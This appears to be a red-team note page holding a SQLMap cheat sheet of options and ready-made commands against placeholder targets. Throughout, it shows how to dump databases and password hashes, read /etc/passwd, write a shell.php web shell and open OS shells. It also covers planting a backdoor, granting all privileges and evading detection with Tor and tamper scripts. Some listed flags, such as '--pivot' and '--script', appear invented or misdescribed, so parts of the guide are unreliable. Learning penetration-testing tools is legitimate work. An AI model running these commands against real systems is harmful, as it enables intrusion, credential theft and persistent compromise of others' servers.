# Index
- [[Red Team/4. Tool Guides/0. Incomplete/Tool Guides]]

## SQLMap

SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection vulnerabilities and taking over database servers. This ultimate edition of the cheat sheet provides an exhaustive list of SQLMap commands, detailed explanations, and advanced usage scenarios.

## Basic Syntax
```bash
sqlmap -u <target_url> [options]
```

## Core Options
- `-u <target_url>`: Specifies the target URL.
- `-d <connection_string>`: Connects directly to the database via a connection string.
- `-r <request_file>`: Loads HTTP request from a file (useful for POST requests).
- `--data <data>`: Specifies data for POST requests.
- `--cookie <cookie>`: Specifies the cookie to use for authentication or session persistence.
- `--proxy <proxy>`: Routes traffic through an HTTP proxy.
- `--level <level>`: Sets the level of tests to perform (1-5, with 5 being the most comprehensive).
- `--risk <risk>`: Sets the risk level of tests (1-3, with 3 being the highest).
- `-o`: Turns on optimization switches for faster testing.

## Detection Options
- `--dbs`: Enumerates available databases on the server.
- `--tables`: Enumerates tables in the specified database.
- `--columns`: Enumerates columns in the specified table.
- `--dump`: Dumps the entries of the specified table or the entire database.
- `--dbms <database>`: Specifies the target DBMS (e.g., MySQL, PostgreSQL, MSSQL).
- `--technique <technique>`: Specifies the SQL injection techniques to use (B, E, U, S, T, Q).
- `--string <string>`: Uses a specific string to test for SQL injection.
- `--not-string <string>`: Specifies a string to avoid detecting false positives.
- `--code <code>`: Uses a specific HTTP status code to detect SQL injection.
- `--time-sec <seconds>`: Sets the delay for time-based blind SQL injection.
- `--union-cols <range>`: Tests for the number of columns used in a UNION query.
- `--union-char <character>`: Specifies the character to use for UNION injection.

## Enumeration Options
- `--dbs`: Retrieves a list of databases on the server.
- `--tables -D <database>`: Retrieves a list of tables in the specified database.
- `--columns -T <table> -D <database>`: Retrieves a list of columns in the specified table.
- `--schema`: Dumps the entire database schema.
- `--dump -T <table> -D <database>`: Dumps all data from the specified table.
- `--dump-all`: Dumps data from all databases and tables.
- `--search -T <table>`: Searches for tables matching a specific pattern.
- `--search -C <column>`: Searches for columns matching a specific pattern.
- `--exclude-sysdbs`: Excludes system databases from enumeration.
- `--sql-query <query>`: Executes a custom SQL query on the database.
- `--sql-shell`: Opens a SQL shell for executing custom SQL commands interactively.
- `--os-shell`: Opens an OS shell if the database allows for command execution.
- `--passwords`: Dumps the database user passwords.
- `--users`: Enumerates database users.
- `--privileges -U <user>`: Enumerates privileges for the specified database user.
- `--roles`: Enumerates roles of database users.

## Injection Techniques
- `-p <parameter>`: Specifies the vulnerable parameter.
- `--level <level>`: Sets the level of testing (1-5).
- `--risk <risk>`: Sets the risk of tests (1-3).
- `--technique=<technique>`: Specifies the injection techniques to test (B: Boolean-based, E: Error-based, U: UNION query-based, S: Stacked queries, T: Time-based blind, Q: Inline queries).
- `--random-agent`: Uses a random user-agent string for the request.
- `--delay <seconds>`: Adds a delay between each request to avoid detection.
- `--timeout <seconds>`: Sets a timeout for the HTTP requests.
- `--retries <number>`: Specifies the number of retries if a request times out.
- `--threads <number>`: Specifies the number of concurrent HTTP requests to make.
- `--tor`: Routes traffic through the Tor network for anonymity.
- `--tor-type=<type>`: Specifies the Tor proxy type (SOCKS5, HTTP).
- `--check-tor`: Verifies if the Tor network is correctly configured.

# Commands and Use Cases

#### Error-Based SQL Injection
Error-based SQL injection relies on forcing the database to generate error messages that reveal information about the database.

1. **Testing for Error-Based SQL Injection**: Attempts to exploit error-based SQL injection.
    ```bash
    sqlmap -u <target_url> --technique=E
    ```
2. **Extracting Data via Error-Based Injection**: Dumps data from the database using error-based techniques.
    ```bash
    sqlmap -u <target_url> --technique=E --dump
    ```
3. **Custom Error-Based Payloads**: Executes a custom error-based SQL query.
    ```bash
    sqlmap -u <target_url> --technique=E --sql-query="SELECT user FROM users WHERE id=1"
    ```

#### Time-Based Blind SQL Injection
Time-based blind SQL injection relies on sending payloads that cause a time delay if the query is true.

1. **Testing for Time-Based Blind SQL Injection**: Attempts to exploit time-based blind SQL injection.
    ```bash
    sqlmap -u <target_url> --technique=T
    ```
2. **Extracting Data with Time-Based Injection**: Dumps data from the database using time-based techniques.
    ```bash
    sqlmap -u <target_url> --technique=T --dump
    ```
3. **Increasing Delay for Slow Responses**: Increases the delay to 10 seconds for time-based tests.
    ```bash
    sqlmap -u <target_url> --technique=T --time-sec=10
    ```

#### Boolean-Based Blind SQL Injection
Boolean-based blind SQL injection involves sending payloads that result in true or false responses, allowing the attacker to infer data.

1. **Testing for Boolean-Based Blind SQL Injection**: Attempts to exploit boolean-based blind SQL injection.
    ```bash
    sqlmap -u <target_url> --technique=B
    ```
2. **Enumerating Database Names**: Enumerates databases using boolean-based techniques.
    ```bash
    sqlmap -u <target_url> --technique=B --dbs
    ```
3. **Dumping Data via Boolean-Based Injection**: Dumps data using boolean-based blind SQL injection.
    ```bash
    sqlmap -u <target_url> --technique=B --dump
    ```

#### UNION Query-Based SQL Injection
UNION-based SQL injection leverages the UNION SQL operator to combine results from multiple queries into a single result.

1. **Testing for UNION-Based SQL Injection**: Attempts to exploit UNION-based SQL injection.
    ```bash
    sqlmap -u <target_url> --technique=U
    ```
2. **Determining the Number of Columns**: Tests for the number of columns needed in the UNION query.
    ```bash
    sqlmap -u <target_url> --technique=U --union-cols=1-10
    ```
3. **Dumping Data via UNION-Based Injection**: Dumps data using UNION-based SQL injection.
    ```bash
    sqlmap -u <target_url> --technique=U --dump
    ```

#### Stacked Queries SQL Injection
Stacked queries allow for the execution of multiple SQL commands in a single query.

1. **Testing for Stacked Queries**: Attempts to exploit stacked queries SQL injection.
    ```bash
    sqlmap -u <target_url> --technique=S
    ```
2. **Executing Arbitrary SQL Commands**: Executes an arbitrary SQL command using stacked queries.
    ```bash
    sqlmap -u <target_url> --technique=S --sql-query="UPDATE users SET role='admin' WHERE username='user'"
    ```
3. **Executing OS Commands via Stacked Queries**: Opens an OS shell if the database allows for command execution via stacked queries.
    ```bash
    sqlmap -u <target_url> --technique=S --os-shell
    ```

#### Post-Exploitation Techniques

Once access to the database has been obtained, SQLMap can be used for further exploitation.

1. **Reading and Writing Files on the Server**: Reads and writes files on the database server.
    ```bash
    sqlmap -u <target_url> --file-read=/etc/passwd
    sqlmap -u <target_url> --file-write=<local_file> --file-dest=/var/www/html/shell.php
    ```
2. **Executing OS Commands**: Executes an OS command on the database server.
    ```bash
    sqlmap -u <target_url> --os-cmd="whoami"
    ```
3. **Maintaining Access with Backdoors**: Opens an OS shell and attempts to install a persistent backdoor on the server.
    ```bash
    sqlmap -u <target_url> --os-shell --os-pwn
    ```
4. **Pivoting Through the Database Server**: Uses the database server as a pivot point to attack other machines within the network.
    ```bash
    sqlmap -u <target_url> --os-shell --pivot --proxy=<proxy_server>
    ```
5. **Exfiltrating Sensitive Data**: Exfiltrates data from the database with multiple threads and a delay to avoid detection.
    ```bash
    sqlmap -u <target_url> --dump --threads=10 --delay=2
    ```

#### Enumeration Techniques

1. **Enumerating Entire Database Schema**: Dumps the entire database schema, including all tables and columns.
    ```bash
    sqlmap -u <target_url> --schema
    ```
2. **Searching for Specific Tables**: Searches for tables that match a specific pattern (e.g., tables starting with "admin").
    ```bash
    sqlmap -u <target_url> --search -T "admin*"
    ```
3. **Searching for Specific Columns**: Searches for columns matching a specific pattern (e.g., columns named "password").
    ```bash
    sqlmap -u <target_url> --search -C "password"
    ```
4. **Dumping Data from All Databases**: Dumps data from all available databases.
    ```bash
    sqlmap -u <target_url> --dump-all
    ```
5. **Dumping Specific Data with Conditions**: Dumps specific data from a table where a condition is met.
    ```bash
    sqlmap -u <target_url> --dump -T users -D database --where="role='admin'"
    ```

#### Privilege Escalation

SQLMap can be used to escalate privileges by exploiting weak configurations or leveraging vulnerable stored procedures.

1. **Enumerating Database Users**: Enumerates all database users.
    ```bash
    sqlmap -u <target_url> --users
    ```
2. **Dumping Password Hashes**: Dumps password hashes of database users.
    ```bash
    sqlmap -u <target_url> --passwords
    ```
3. **Identifying Privileged Users**: Identifies users with administrative or elevated privileges.
    ```bash
    sqlmap -u <target_url> --privileges
    ```
4. **Privilege Escalation via Vulnerable Stored Procedures**: Exploits vulnerable stored procedures to escalate privileges.
    ```bash
    sqlmap -u <target_url> --os-pwn
    ```
5. **Escalating to DBA**: Attempts to escalate the current user to a DBA (Database Administrator) role.
    ```bash
    sqlmap -u <target_url> --dbs --privileges --sql-query="GRANT ALL PRIVILEGES ON *.* TO 'user'@'localhost'"
    ```

#### Defense Evasion Techniques

SQLMap offers several options for evading detection by IDS/IPS systems and other defensive measures.

1. **Using Random User-Agent Strings**: Randomizes the User-Agent string to avoid detection by web application firewalls (WAFs).
    ```bash
    sqlmap -u <target_url> --random-agent
    ```
2. **Adding Delays Between Requests**: Adds a delay of 5 seconds between each request to avoid triggering rate-limiting mechanisms.
    ```bash
    sqlmap -u <target_url> --delay=5
    ```
3. **Using Tor for Anonymity**: Routes SQLMap traffic through the Tor network for anonymity.
    ```bash
    sqlmap -u <target_url> --tor --tor-type=SOCKS5 --check-tor
    ```
4. **Evading WAFs with Tampering Scripts**: Uses tamper scripts to modify SQL queries and evade WAFs (e.g., `--tamper=space2comment`).
    ```bash
    sqlmap -u <target_url> --tamper=<tamper_script>
    ```
5. **Randomizing HTTP Parameters**: Randomizes specified HTTP parameters to avoid detection based on static analysis.
    ```bash
    sqlmap -u <target_url> --randomize=param1,param2
    ```

#### Automation and Scripting

SQLMap can be scripted and automated for use in large-scale penetration tests or red team engagements.

1. **Batch Mode for Non-Interactive Use**: Runs SQLMap in non-interactive mode, accepting default options automatically.
    ```bash
    sqlmap -u <target_url> --batch
    ```
2. **Using SQLMap API for Automation**: Uses the SQLMap API to automate SQL injection testing across multiple targets.
    ```bash
    sqlmapapi -s
    # Start the client
    sqlmapapi -c
    # Submit a task
    curl -X POST -H "Content-Type: application/json" -d '{"url": "<target_url>"}' http://127.0.0.1:8775/task/new
    ```
3. **Integrating with CI/CD Pipelines**: Integrates SQLMap into continuous integration/continuous deployment (CI/CD) pipelines for automated security testing.
    ```bash
    sqlmap -u <target_url> --batch --output-dir=/path/to/reports --level=5 --risk=3
    ```
4. **Custom Scripts for Targeted Attacks**: Uses custom Python scripts with SQLMap to perform targeted attacks or handle complex scenarios.
    ```bash
    sqlmap -u <target_url> --script=<custom_script.py>
    ```
5. **Parallel Testing Across Multiple Targets**: Runs SQLMap in parallel across multiple targets listed in `targets.txt`.
    ```bash
    cat targets.txt | xargs -I {} -P 10 sqlmap -u {} --batch
    ```

# Resources

|**Name**|**URL**|
|---|---|
|SQLMap Documentation|https://sqlmap.org/|
|SQL Injection Cheat Sheet|https://portswigger.net/web-security/sql-injection/cheat-sheet|
|Advanced SQLMap Usage|https://www.offensive-security.com/metasploit-unleashed/sqlmap/|
|SQLMap Tamper Scripts|https://github.com/sqlmapproject/sqlmap/tree/master/tamper|
|SQLMap API Guide|https://sqlmap.org/#api|
|Understanding SQL Injection|https://www.acunetix.com/websitesecurity/sql-injection/|
|Bypassing WAFs with SQLMap|https://www.hackingarticles.in/sqlmap-bypassing-waf-with-tamper-scripts/|
|Automating SQLMap in CI/CD|https://medium.com/@austin.pammer/automating-sqlmap-in-ci-cd-pipeline-52a15d8b7f9e|
|Exploiting SQL Injection with SQLMap|https://resources.infosecinstitute.com/topic/exploiting-sql-injection-with-sqlmap/|
|SQLMap CTF Challenges|https://ctftime.org/writeups/overview/sqlmap|